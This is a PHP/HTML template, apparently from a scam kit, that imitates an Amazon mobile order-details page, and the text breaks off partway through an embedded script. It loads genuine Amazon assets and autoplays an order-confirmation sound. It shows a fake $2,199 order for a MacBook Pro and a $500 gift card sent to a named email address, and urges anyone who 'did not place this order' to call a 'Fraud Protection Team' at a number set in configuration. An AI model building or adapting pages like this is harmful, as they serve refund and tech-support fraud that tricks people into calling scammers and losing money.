<?php
error_reporting(0);
session_start();
ob_start();
header('Content-Type: text/html; charset=utf-8');
include '../../config.php';

if (empty($_SESSION['email'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['pass'])) {
  header("location: ../../Forbidden");
  exit();
}



// Get today's date
$today = date('M d, Y');
$currentDate = date('l, F j, Y');
// Get the date after 3 days
$dateAfter3Days = date('M d, Y', strtotime('+3 days'));

// Output the dates
?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.22.1-2022-05-20">

<head>
<audio id="audioPlayer" src="orderconfirm.mp3" type="audio/mpeg"></audio>

<script>
    // JavaScript to play the audio automatically
    window.addEventListener('load', function () {
        var audio = document.getElementById('audioPlayer');
        audio.play();
    });
</script>
  <script>
    var aPageStart = (new Date()).getTime();
  </script>
  <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
  <meta charset="utf-8">
  <title>Order Details</title>
  <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <link href="../../favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01rXlRztnIL.css,41b6dUqOGcL.css,312+3GosuzL.css,11+5Zkv0+pL.css,01NtHviPbnL.css,0131vqwP5UL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,11ssRyboARL.css,017oxx82kUL.css,41tu2pCE83L.css,01B-YPN7k2L.css,21asbVwBAKL.css,21av6WXnrdL.css,11hcDsGAR1L.css,21AL2IbGWYL.css,01Zit5mlZtL.css,01CFUgsA-YL.css,31QBg5wd9xL.css,013ZbRX2A7L.css,112j6WRt7cL.css,219k7gEqxTL.css,11VvAxw559L.css,01iN9LjVqhL.css,11Dg5X2FOfL.css,21m6nqVwQ7L.css,11XldXvWmcL.css,01vd5lqeZUL.css,21Ho6cJWf-L.css,11pA-LAYEML.css,11FImvIW68L.css,11Ty7A6HeXL.css,01890+Vwk8L.css,011taseCFPL.css,11eI5SJms1L.css,01cbS3UK11L.css,21XB1sivn0L.css,01INc4pyFRL.css_.css?AUIClients/AmazonUI#mobile.fr.not-trident">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01NjQbvCUVL.css?AUIClients/AbbottViewComponentMobileAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/31E2uCL+CuL.css?AUIClients/AbbottPortalAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11YuQ0DJSqL.css?AUIClients/AbbottViewComponentCommonAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/51yFEbMJ8yL._RC|419uoI5318L.css,01+72+wCC9L.css_.css?AUIClients/AmazonNavigationMobileMetaAsset#mobile">
  <script>
    (function(g, h, O, C) {
      function D(a) {
        u && u.tag && u.tag(q(":", "aui", a))
      }

      function v(a, b) {
        u && u.count && u.count("aui:" + a, 0 === b ? 0 : b || (u.count("aui:" + a) || 0) + 1)
      }

      function m(a) {
        try {
          return a.test(navigator.userAgent)
        } catch (b) {
          return !1
        }
      }

      function x(a, b, c) {
        a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c)
      }

      function q(a, b, c, e) {
        b = b && c ? b + a + c : b || c;
        return e ? q(a, b, e) : b
      }

      function E(a, b, c) {
        try {
          Object.defineProperty(a, b, {
            value: c,
            writable: !1
          })
        } catch (e) {
          a[b] = c
        }
        return c
      }

      function qa(a, b, c) {
        var e =
          c = a.length,
          f = function() {
            e-- || (P.push(b), Q || (setTimeout(aa, 0), Q = !0))
          };
        for (f(); c--;) ba[a[c]] ? f() : (y[a[c]] = y[a[c]] || []).push(f)
      }

      function ra(a, b, c, e, f) {
        var d = h.createElement(a ? "script" : "link");
        x(d, "error", e);
        f && x(d, "load", f);
        a ? (d.type = "text/javascript", d.async = !0, c && /AUIClients|images[/]I/.test(b) && d.setAttribute("crossorigin", "anonymous"), d.src = b) : (d.rel = "stylesheet", d.href = b);
        h.getElementsByTagName("head")[0].appendChild(d)
      }

      function ca(a, b) {
        return function(c, e) {
          function f() {
            ra(b, c, d, function(b) {
              R ? v("resource_unload") :
                d ? (d = !1, v("resource_retry"), f()) : (v("resource_error"), a.log("Asset failed to load: " + c));
              b && b.stopPropagation ? b.stopPropagation() : g.event && (g.event.cancelBubble = !0)
            }, e)
          }
          if (da[c]) return !1;
          da[c] = !0;
          v("resource_count");
          var d = !0;
          return !f()
        }
      }

      function sa(a, b, c) {
        for (var e = {
            name: a,
            guard: function(c) {
              return b.guardFatal(a, c)
            },
            guardTime: function(a) {
              return b.guardTime(a)
            },
            logError: function(c, d, f) {
              b.logError(c, d, f, a)
            }
          }, f = [], d = 0; d < c.length; d++) F.hasOwnProperty(c[d]) && (f[d] = S.hasOwnProperty(c[d]) ? S[c[d]](F[c[d]],
          e) : F[c[d]]);
        return f
      }

      function z(a, b, c, e, f) {
        return function(d, h) {
          function n() {
            var a = null;
            e ? a = h : "function" === typeof h && (p.start = w(), a = h.apply(g, sa(d, k, l)), p.end = w());
            if (b) {
              F[d] = a;
              a = d;
              for (ba[a] = !0;
                (y[a] || []).length;) y[a].shift()();
              delete y[a]
            }
            p.done = !0
          }
          var k = f || this;
          "function" === typeof d && (h = d, d = C);
          b && (d = d ? d.replace(ea, "") : "__NONAME__", T.hasOwnProperty(d) && k.error(q(", reregistered by ", q(" by ", d + " already registered", T[d]), k.attribution), d), T[d] = k.attribution);
          for (var l = [], m = 0; m < a.length; m++) l[m] =
            a[m].replace(ea, "");
          var p = A[d || "anon" + ++ta] = {
            depend: l,
            registered: w(),
            namespace: k.namespace
          };
          d && ua.hasOwnProperty(d);
          c ? n() : qa(l, k.guardFatal(d, n), d);
          return {
            decorate: function(a) {
              S[d] = k.guardFatal(d, a)
            }
          }
        }
      }

      function fa(a) {
        return function() {
          var b = Array.prototype.slice.call(arguments);
          return {
            execute: z(b, !1, a, !1, this),
            register: z(b, !0, a, !1, this)
          }
        }
      }

      function U(a, b) {
        return function(c, e) {
          e || (e = c, c = C);
          var f = this.attribution;
          return function() {
            t.push(b || {
              attribution: f,
              name: c,
              logLevel: a
            });
            var d = e.apply(this, arguments);
            t.pop();
            return d
          }
        }
      }

      function G(a, b) {
        this.load = {
          js: ca(this, !0),
          css: ca(this)
        };
        E(this, "namespace", b);
        E(this, "attribution", a)
      }

      function ha() {
        h.body ? p.trigger("a-bodyBegin") : setTimeout(ha, 20)
      }

      function B(a, b) {
        a.className = V(a, b) + " " + b
      }

      function V(a, b) {
        return (" " + a.className + " ").split(" " + b + " ").join(" ").replace(/^ | $/g, "")
      }

      function ia(a) {
        try {
          return a()
        } catch (b) {
          return !1
        }
      }

      function H() {
        if (I) {
          var a = {
            w: g.innerWidth || n.clientWidth,
            h: g.innerHeight || n.clientHeight
          };
          5 < Math.abs(a.w - W.w) || 50 < a.h - W.h ? (W = a, J = 4, (a = k.mobile ||
            k.tablet ? 450 < a.w && a.w > a.h : 1250 <= a.w) ? B(n, "a-ws") : n.className = V(n, "a-ws")) : 0 < J && (J--, ja = setTimeout(H, 16))
        }
      }

      function va(a) {
        (I = a === C ? !I : !!a) && H()
      }

      function wa() {
        return I
      }
      "use strict";
      var K = O.now = O.now || function() {
          return +new O
        },
        w = function(a) {
          return a && a.now ? a.now.bind(a) : K
        }(g.performance),
        L = w(),
        ua = {},
        r = g.AmazonUIPageJS || g.P;
      if (r && r.when && r.register) {
        L = [];
        for (var l = h.currentScript; l; l = l.parentElement) l.id && L.push(l.id);
        return r.log("A copy of P has already been loaded on this page.", "FATAL", L.join(" "))
      }
      var u =
        g.ue;
      D();
      D("aui_build_date:3.22.1-2022-05-20");
      var P = [],
        xa = [],
        Q = !1;
      var aa = function() {
        for (var a = setTimeout(aa, 0), b = K(); xa.length || P.length;)
          if (P.shift()(), 50 < K() - b) return;
        clearTimeout(a);
        Q = !1
      };
      var ba = {},
        y = {},
        da = {},
        R = !1;
      x(g, "beforeunload", function() {
        R = !0;
        setTimeout(function() {
          R = !1
        }, 1E4)
      });
      var ea = /^prv:/,
        T = {},
        F = {},
        S = {},
        A = {},
        ta = 0,
        X = String.fromCharCode(92),
        t = [],
        ka = !0,
        la = g.onerror;
      g.onerror = function(a, b, c, e, f) {
        f && "object" === typeof f || (f = Error(a, b, c), f.columnNumber = e, f.stack = b || c || e ? q(X, f.message, "at " +
          q(":", b, c, e)) : C);
        var d = t.pop() || {};
        f.attribution = q(":", f.attribution || d.attribution, d.name);
        f.logLevel = d.logLevel;
        f.attribution && console && console.log && console.log([f.logLevel || "ERROR", a, "thrown by", f.attribution].join(" "));
        t = [];
        la && (d = [].slice.call(arguments), d[4] = f, la.apply(g, d))
      };
      G.prototype = {
        logError: function(a, b, c, e) {
          b = {
            message: b,
            logLevel: c || "ERROR",
            attribution: q(":", this.attribution, e)
          };
          if (g.ueLogError) return g.ueLogError(a || b, a ? b : null), !0;
          console && console.error && (console.log(b), console.error(a));
          return !1
        },
        error: function(a, b, c, e) {
          a = Error(q(":", e, a, c));
          a.attribution = q(":", this.attribution, b);
          throw a;
        },
        guardError: U(),
        guardFatal: U("FATAL"),
        guardCurrent: function(a) {
          var b = t[t.length - 1];
          return b ? U(b.logLevel, b).call(this, a) : a
        },
        guardTime: function(a) {
          var b = t[t.length - 1],
            c = b && b.name;
          return c && c in A ? function() {
            var b = w(),
              f = a.apply(this, arguments);
            A[c].async = (A[c].async || 0) + w() - b;
            return f
          } : a
        },
        log: function(a, b, c) {
          return this.logError(null, a, b, c)
        },
        declare: z([], !0, !0, !0),
        register: z([], !0),
        execute: z([]),
        AUI_BUILD_DATE: "3.22.1-2022-05-20",
        when: fa(),
        now: fa(!0),
        trigger: function(a, b, c) {
          var e = K();
          this.declare(a, {
            data: b,
            pageElapsedTime: e - (g.aPageStart || NaN),
            triggerTime: e
          });
          c && c.instrument && M.when("prv:a-logTrigger").execute(function(b) {
            b(a)
          })
        },
        handleTriggers: function() {
          this.log("handleTriggers deprecated")
        },
        attributeErrors: function(a) {
          return new G(a)
        },
        _namespace: function(a, b) {
          return new G(a, b)
        },
        setPriority: function(a) {
          ka ? ka = !1 : this.log("setPriority only accept the first call.")
        }
      };
      var p = E(g, "AmazonUIPageJS",
        new G);
      var M = p._namespace("PageJS", "AmazonUI");
      M.declare("prv:p-debug", A);
      p.declare("p-recorder-events", []);
      p.declare("p-recorder-stop", function() {});
      E(g, "P", p);
      ha();
      if (h.addEventListener) {
        var ma;
        h.addEventListener("DOMContentLoaded", ma = function() {
          p.trigger("a-domready");
          h.removeEventListener("DOMContentLoaded", ma, !1)
        }, !1)
      }
      var n = h.documentElement,
        Y = function() {
          var a = ["O", "ms", "Moz", "Webkit"],
            b = h.createElement("div");
          return {
            testGradients: function() {
              return !0
            },
            test: function(c) {
              var e = c.charAt(0).toUpperCase() +
                c.substr(1);
              c = (a.join(e + " ") + e + " " + c).split(" ");
              for (e = c.length; e--;)
                if ("" === b.style[c[e]]) return !0;
              return !1
            },
            testTransform3d: function() {
              return !0
            }
          }
        }();
      r = n.className;
      var na = /(^| )a-mobile( |$)/.test(r),
        oa = /(^| )a-tablet( |$)/.test(r),
        k = {
          audio: function() {
            return !!h.createElement("audio").canPlayType
          },
          video: function() {
            return !!h.createElement("video").canPlayType
          },
          canvas: function() {
            return !!h.createElement("canvas").getContext
          },
          svg: function() {
            return !!h.createElementNS && !!h.createElementNS("http://www.w3.org/2000/svg",
              "svg").createSVGRect
          },
          offline: function() {
            return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
          },
          dragDrop: function() {
            return "draggable" in h.createElement("span")
          },
          geolocation: function() {
            return !!navigator.geolocation
          },
          history: function() {
            return !(!g.history || !g.history.pushState)
          },
          webworker: function() {
            return !!g.Worker
          },
          autofocus: function() {
            return "autofocus" in h.createElement("input")
          },
          inputPlaceholder: function() {
            return "placeholder" in h.createElement("input")
          },
          textareaPlaceholder: function() {
            return "placeholder" in
              h.createElement("textarea")
          },
          localStorage: function() {
            return "localStorage" in g && null !== g.localStorage
          },
          orientation: function() {
            return "orientation" in g
          },
          touch: function() {
            return "ontouchend" in h
          },
          gradients: function() {
            return Y.testGradients()
          },
          hires: function() {
            var a = g.devicePixelRatio && 1.5 <= g.devicePixelRatio || g.matchMedia && g.matchMedia("(min-resolution:144dpi)").matches;
            v("hiRes" + (na ? "Mobile" : oa ? "Tablet" : "Desktop"), a ? 1 : 0);
            return a
          },
          transform3d: function() {
            return Y.testTransform3d()
          },
          touchScrolling: function() {
            return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|SOFTWARE=([5-9]|[1-9][0-9]+)(.[0-9]{1,2})+.*DEVICE=iPhone|Chrome|Silk|Firefox|Trident.+?; Touch/i)
          },
          ios: function() {
            return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) && !m(/trident|Edge/i)
          },
          android: function() {
            return m(/android.([1-9]|[L-Z])/i) && !m(/trident|Edge/i)
          },
          mobile: function() {
            return na
          },
          tablet: function() {
            return oa
          },
          rtl: function() {
            return "rtl" === n.dir
          }
        };
      for (l in k) k.hasOwnProperty(l) && (k[l] = ia(k[l]));
      for (var Z = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), N = 0; N < Z.length; N++) k[Z[N]] = ia(function() {
        return Y.test(Z[N])
      });
      var I = !0,
        ja = 0,
        W = {
          w: 0,
          h: 0
        },
        J = 4;
      H();
      x(g, "resize", function() {
        clearTimeout(ja);
        J = 4;
        H()
      });
      var pa = {
        getItem: function(a) {
          try {
            return g.localStorage.getItem(a)
          } catch (b) {}
        },
        setItem: function(a, b) {
          try {
            return g.localStorage.setItem(a, b)
          } catch (c) {}
        }
      };
      n.className = V(n, "a-no-js");
      B(n, "a-js");
      !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i) || g.navigator.standalone || m(/safari/i) || B(n, "a-ember");
      r = [];
      for (l in k) k.hasOwnProperty(l) && k[l] && r.push("a-" + l.replace(/([A-Z])/g, function(a) {
        return "-" + a.toLowerCase()
      }));
      B(n, r.join(" "));
      n.setAttribute("data-aui-build-date",
        "3.22.1-2022-05-20");
      p.register("p-detect", function() {
        return {
          capabilities: k,
          localStorage: k.localStorage && pa,
          toggleResponsiveGrid: va,
          responsiveGridEnabled: wa
        }
      });
      m(/UCBrowser/i) || k.localStorage && B(n, pa.getItem("a-font-class"));
      p.declare("a-event-revised-handling", !1);
      p.execute("RetailPageServiceWorker", function() {
        function a() {
          e.forEach(function(a) {
            D(a)
          })
        }

        function b(a, b, c) {
          if (b) {
            a = m(/Chrome/i) && !m(/Edge/i) && !m(/OPR/i) && !a.capabilities.isAmazonApp && !m(new RegExp(X + "bwv" + X + "b"));
            var d = "sw:browser:" + c +
              ":";
            b.browser && a && (e.push(d + "supported"), b.browser.action(d, c));
            !a && b.browser && e.push(d + "unsupported")
          }
        }
        try {
          var c = navigator.serviceWorker
        } catch (f) {
          D("sw:nav_err")
        }
        c && (x(c, "message", function(a) {
          a && a.data && v(a.data.k, a.data.v)
        }), c.controller && c.controller.postMessage("MSG-RDY"));
        var e = [];
        (function(f) {
          var d = f.reg,
            h = f.unreg;
          c && c.getRegistrations ? (M.when("A").execute(function(a) {
            b(a, h, "unregister")
          }), x(g, "load", function() {
            M.when("A").execute(function(c) {
              b(c, d, "register");
              a()
            })
          })) : (d && d.browser && e.push("sw:browser:register:unsupported"),
            h && h.browser && e.push("sw:browser:unregister:unsupported"), a())
        })({
          reg: {},
          unreg: {}
        })
      });
      p.declare("a-fix-event-off", !1);
      v("pagejs:pkgExecTime", w() - L)
    })(window, document, Date);
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/61lemL2h6EL._RC|11Y+5x+kkTL.js,5110husWMzL.js,11yKORv-GTL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,21SDJtBU-PL.js,01E8f3KV-NL.js,11rRjDLdAVL.js,51RzYQslpZL.js,11UdUjBLtPL.js,11tMohjWmVL.js,11OREnu1epL.js,11wcWdhrnDL.js,21ssiLNIZvL.js,0190vxtlzcL.js,61KJnVMUbNL.js,01JYHc2oIlL.js,31d5PLRqbQL.js,31J9sEK3CtL.js,11bEz2VIYrL.js,31dreCHeIuL.js,01qkmZhGmAL.js,0197uKrNvvL.js_.js?AUIClients/AmazonUI&KK9dlo3A#mobile.412402-T1.412405-T1');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01AiKkUsdTL.js?AUIClients/AbbottViewComponentMobileAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/21QREc8SBAL.js?AUIClients/AbbottPortalAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/419dERTK6xL.js?AUIClients/AbbottViewComponentCommonAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/419T3U4YyUL._RC|41yWQpMBvkL.js,01CMyuQ8OQL.js,31odYvSoo1L.js_.js?AUIClients/AmazonNavigationMobileMetaAsset');
  </script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/61lemL2h6EL._RC|11Y+5x+kkTL.js,5110husWMzL.js,11yKORv-GTL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,21SDJtBU-PL.js,01E8f3KV-NL.js,11rRjDLdAVL.js,51RzYQslpZL.js,11UdUjBLtPL.js,11tMohjWmVL.js,11OREnu1epL.js,11wcWdhrnDL.js,21ssiLNIZvL.js,0190vxtlzcL.js,61KJnVMUbNL.js,01JYHc2oIlL.js,31d5PLRqbQL.js,31J9sEK3CtL.js,11bEz2VIYrL.js,31dreCHeIuL.js,01qkmZhGmAL.js,0197uKrNvvL.js_.js?AUIClients/AmazonUI&amp;KK9dlo3A#mobile.412402-T1.412405-T1"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01AiKkUsdTL.js?AUIClients/AbbottViewComponentMobileAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/21QREc8SBAL.js?AUIClients/AbbottPortalAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/419dERTK6xL.js?AUIClients/AbbottViewComponentCommonAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/419T3U4YyUL._RC|41yWQpMBvkL.js,01CMyuQ8OQL.js,31odYvSoo1L.js_.js?AUIClients/AmazonNavigationMobileMetaAsset"></script>

</head>

<body data-language-code="fr-FR" class="abbott-view a-m-fr a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_launch_2021_ally_fixes_392482-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
  <div id="a-page">
    <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
    <div class="a-section abbott-view-header">



      <div class="a-section a-spacing-none">



        <div class="a-section abbott-view-component">
          <?php include '../header.php'; ?>

        </div>


      </div>


      <div class="a-section a-touch">
        <div class="a-container">












          <div class="" data-component="debugBanner">




            <div class="a-section a-spacing-base abbott-view-component">
              <div class="a-box a-alert a-alert-success" role="alert">
                <div class="a-box-inner a-alert-container">
                  <h4 class="a-alert-heading">Hello Coustomer</h4>
                  <div class="a-alert-content">
                    <div class="a-section">
                      Thank you for placing order with us Your order is being processed and will be shipped shortly Your estimated delivery date is indicated below If you would like to cancel your order or make any changes to it please reach Help-Desk

                    </div>

                  </div>
                </div>
              </div>
            </div>















          </div>















          <div class="" data-component="backToHistoryLink">

















          </div>















          <div class="" data-component="orderMessaging">


















          </div>















          <div class="" data-component="banner">























          </div>















          <div class="" data-component="auiOrderAlert">


















          </div>















          <div class="" data-component="pharmacyPartiallyCancelledOrderAlert">


















          </div>















          <div class="" data-component="primeWardrobeFullAuthAlert">


















          </div>















          <div class="" data-component="returnAlert">


















          </div>















          <div class="" data-component="gcShareableItems">


















          </div>















          <div class="" data-component="briefOrderSummary">











            <div class="a-section">
              <h3 class="a-size-large a-spacing-micro"> View order details </h3>
              <div class="a-box a-vertical">
                <div class="a-box-inner a-padding-none">
                  <ul class="a-unordered-list a-nostyle a-box-list">
                    <li><span class="a-list-item">
                        <div class="a-section a-padding-medium">
                          <div class="a-row">
                            <div class="a-column a-span5">
                              <p class="a-size-base a-color-secondary"> Order date </p><!-- for paragraph -->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span7 a-span-last">
                              <p class="a-size-base"> <?php echo $today ?> </p><!-- for paragraph -->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span5">
                              <p class="a-size-base a-color-secondary"> Order # </p><!-- for paragraph -->
                            </div> <!-- for grid_column-->
                            <div class="a-column a-span7 a-span-last">
                              <p class="a-size-base"> 112-7593846-1938274 </p><!-- for paragraph -->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                          <div class="a-row">
                            <div class="a-column a-span5">
                              <p class="a-size-base a-color-secondary"> Order total </p><!-- for paragraph -->
                            </div> <!-- for table_column-->
                            <div class="a-column a-span7 a-span-last">
                              <p id="od-summary-content-total" class="a-size-base"> $2,199.00 <span class="a-size-base a-color-secondary"> (2 items) </span><!-- for text --> </p><!-- for paragraph -->
                            </div> <!-- for grid_column-->
                          </div> <!-- for grid_row-->
                        </div> <!-- for section -->
                      </span></li> <!-- for list_item -->
                    <li><span class="a-list-item"> <a href="<?php $calling_link ?>" class="a-touch-link a-box a-touch-link-noborder">
                          <div class="a-box-inner"><i class="a-icon a-icon-touch-link"></i> Help-Desk </div>
                        </a> </span>

                      </a> </span></li>
                  </ul>
                </div>
              </div>
            </div>








          </div>















          <div class="" data-component="bookingShipment">


















          </div>















          <div class="" data-component="treasureTruckPickupDetails">


















          </div>















          <div class="" data-component="primeGift">


















          </div>















          <div class="" data-component="orderCard">















          </div>















          <div class="" data-component="shipmentDetails">











            <div class="a-section"><br>
              <h3 class="a-box-title"> Shipment details </h3>
              <div class="a-box">
                <div class="a-box-inner">
                  <div class="a-box">
                    <div class="a-box-inner">
                      <div class="a-section">
                        <h3> Package is out for delivery. </h3><!--for heading-->
                        <p class="a-spacing-none no-margin">Delivery Estimate</p><span class="a-size-base a-color-success a-text-bold"><?php echo $currentDate ?> by 9pm </span><!--for text -->
                      </div> <!--for section-->
                      <div class="a-section a-padding-none">
                        <div class="a-row">
                          <div class="a-column a-span3"> <a class="a-link-normal a-padding-none" title="Kaytee 7&amp;quot; Clear Run-About Exercise Ball For Pet Hamsters &amp;amp;" href="/gp/aw/d/B0002AS8PM/ref=ya_aw_od_pi?ie=UTF8&amp;psc=1">
                              <div class="a-section item-view-left-col-inner">
                                <div class="item-view-left-col-inner"> <img alt="" src="https://c.media-amazon.com/images/I/61SdxEONyuL._AC_AA135_.jpg" data-a-hires="https://c.media-amazon.com/images/I/61SdxEONyuL._AC_AA135_.jpg"> </div>
                              </div>
                            </a> <!--for link --> </div> <!--for grid_column-->
                          <div class="a-column a-span9 a-span-last">
                            <div class="a-row">
                              <div class="a-column a-span8"> <a class="a-link-normal a-padding-none a-color-base" title="title" href="#"> <span class="a-size-base a-text-bold">Apple 2023 MacBook Pro Laptop M3 Pro chip with 11‑core CPU, 14‑core GPU </span><!-- for text --> </a><!--for link --> </div><!--for grid_column-->
                              <div class="a-column a-span4 a-text-right a-span-last"> <span class="a-size-base a-color-base"> $1,699.00 </span><!-- for text --> </div><!--for grid_column-->
                            </div><!--for grid_row -->
                            <div class="a-row"> <span class="a-size-small a-color-secondary"> Qty: 1 </span> </div>
                            <div class="a-row a-spacing-mini"> <span class="a-size-small a-color-secondary"> Sold By: Amazon.com Services, Inc </span> </div>
                          </div><!--for grid_column-->
                        </div><!--for grid_row-->
                        <div class="a-row">
                          <div class="a-column a-span3"> <a class="a-link-normal a-padding-none" title="Apple" href="#">
                              <div class="a-section item-view-left-col-inner">
                                <div class="item-view-left-col-inner"> <img alt="" src="https://c.media-amazon.com/images/I/41YlI1LTqBL.jpg" data-a-hires="https://c.media-amazon.com/images/I/41YlI1LTqBL.jpg"> </div>
                              </div>
                            </a> <!--for link --> </div> <!--for grid_column-->
                          <div class="a-column a-span9 a-span-last">
                            <div class="a-row">
                              <div class="a-column a-span8"> <a class="a-link-normal a-padding-none a-color-base" title="title" href="/gp/aw/d/B0002AS8PM/ref=ya_aw_od_pi?ie=UTF8&amp;psc=1"> <span class="a-size-base a-text-bold"> Apple Gift Card - App Store, iTunes, iPhone, iPadand more</span><!-- for text --> </a><!--for link --> </div><!--for grid_column-->
                              <div class="a-column a-span4 a-text-right a-span-last"> <span class="a-size-base a-color-base"> $500.00 </span><!-- for text --> </div><!--for grid_column-->
                            </div><!--for grid_row -->
                            <div class="a-row"> <span class="a-size-small a-color-secondary"> Qty: 1 </span> </div>
                            <div class="a-row"> <span class="a-size-small a-color-secondary"> Send to: menorman743@yahoo.com</span> </div>
                            <div class="a-row a-spacing-mini"> <span class="a-size-small a-color-secondary"> Sold By: Amazon.com Services, Inc </span> </div>
                          </div><!--for grid_column-->
                        </div>
                      </div><!--for section-->
                      <script type="text/javascript">
                        P.when('A', 'jQuery').execute(function(A, $) {
                          A.declarative('remaining-customizations-action', 'click', function(event) {
                            event.$currentTarget.parent().find(".remaining_customization_info").show();
                            event.$currentTarget.hide();
                            event.$event.preventDefault();
                          });
                        });
                      </script>
                    </div>
                  </div>
                  </a>
                </div>
              </div>
            </div>








          </div>















          <div class="" data-component="janeItems">


















          </div>















          <div class="" data-component="cancelledItems">


















          </div>















          <div class="" data-component="techSupport">











            <div class="a-section"> <br>
              <h2 class="a-box-title"> Help-Desk </h2>
              <div class="a-box-group a-box a-alert a-alert-error">
                <div class="a-box">
                  <div class="a-box-inner a-text-bold"> <h3>If you did not place this order, please contact our <span class="a-color-price">Fraud Protection Team  </span>immediately</h3></div>
                </div>
                <div class="a-box a-color-alternate-background">
                  <div class="a-box-inner ">
                    <div class="a-section a-padding-none"> <a class="a-link-normal" title="" href="<?php $calling_link ?>">
                        <div class="a-row a-grid-vertical-align a-grid-center">
                          <div class="a-column a-span3">
                            <div class="a-section">
                              <div class="item-view-left-col-inner"> <img alt="Support" src="https://i.ibb.co/ypXXbGG/image.png" height="40" width="40" title="support"> </div>
                            </div>
                          </div>
                          <div class="a-column a-span9 a-span-last"> <span class="a-size-medium a-color-price a-text-bold"> Call at <?php echo  $supoort_number ?> </span> </div>
                        </div>
                      </a> </div>
                  </div>
                </div>
              </div>
            </div>








          </div>


          <div class="" data-component="paymentInformation">











            <div class="a-section"><br>
              <h3 class="a-box-title"> Payment information </h3><!-- for heading-->
              <div class="a-box a-vertical">
                <div class="a-box-inner a-padding-none">
                  <ul class="a-unordered-list a-nostyle a-box-list">
                    <script type="text/javascript">
                      //<![CDATA[ (function(){"undefined"===typeof PaymentsPortal2&&(PaymentsPortal2={toString:function(){return"PaymentsPortal2"}});"undefined"===typeof APX&&(APX=PaymentsPortal2);if(!PaymentsPortal2.modules){var n=function(){};"undefined"!==typeof console&&console.error&&(n=function(){console.error(Array.prototype.slice.call(arguments,0).join(" "))});var l=function(){function l(b,a){var d;d=0<a.length&&"."===a.charAt(0)?b.split(/\/+/).concat(a.split(/\/+/)):a.split(/\/+/);for(var e=[],f=0,k=d.length;f<k;f++){var h= d[f];""!==h&&"."!==h&&(".."===h?e.pop():e.push(h))}return e.join("/")}function s(b,a){for(var d=[],e=0,f=a.length;e<f;e++)d.push(l(b,a[e]));return d}function g(b,c){delete a._loading[b];a._modules[b]=c;if(a._waiting[b]){var d=a._waiting[b];delete a._waiting[b];for(var e=0,f=d.length;e<f;e++)try{d[e](c)}catch(k){n("Callback waiting on module ["+b+"] failed: "+k)}}}function p(b){if(a._modules[b])return a._modules[b];if(a._loading[b]||!a._definitions[b])return null;var c=a._definitions[b];a._loading[b]= {start_time:Date.now()};m(s(b,c.deps),function(){var a=Array.prototype.slice.call(arguments,0),a=c.factory.apply(null,a);g(b,a)})}function 